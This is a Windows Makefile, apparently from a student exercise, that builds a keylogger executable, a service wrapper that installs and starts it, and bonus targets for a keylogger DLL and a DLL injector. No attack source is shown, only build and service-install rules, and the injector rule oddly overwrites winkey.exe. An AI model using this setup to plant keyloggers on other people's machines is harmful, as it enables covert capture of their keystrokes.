SRCS = keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c
FLAGS = /Wall /WX
RC_FILE = res\version.rc
RES_FILE = res\version.res

all: $(RES_FILE) winkey.exe svc.exe

$(RES_FILE): $(RC_FILE)
	rc /fo $(RES_FILE) $(RC_FILE)

winkey.exe: $(SRCS) keylog\exemain.c
	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib

svc.exe: service\svc.cpp
	$(CC) $(FLAGS) -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib

bonus: keylogger.dll injector.exe

keylogger.dll: keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c keylog/dllmain.c
	cl /LD $(FLAGS) keylog\keylogger.c keylog\init_logger.c keylog\sys_getter.c keylog\dllmain.c /link user32.lib /Fe:keylogger.dll

injector.exe: keylog/injector.c $(RES_FILE)
	cl $(FLAGS) keylog\injector.c $(RES_FILE) user32.lib psapi.lib /Fe:winkey.exe

clean:
	del /Q *.obj 2>nul

fclean: clean
	@echo "Cleaning up..."
	start svc.exe stop
	start svc.exe delete
	del /Q res\*.res 2>nul
	del /Q *.exe 2>nul
	del /Q logs.txt 2>nul
	del /Q *.dll 2>nul

run: winkey.exe svc.exe
	@echo "Running Winkey and Svc..."
	start svc.exe install
	start svc.exe start
re: fclean all
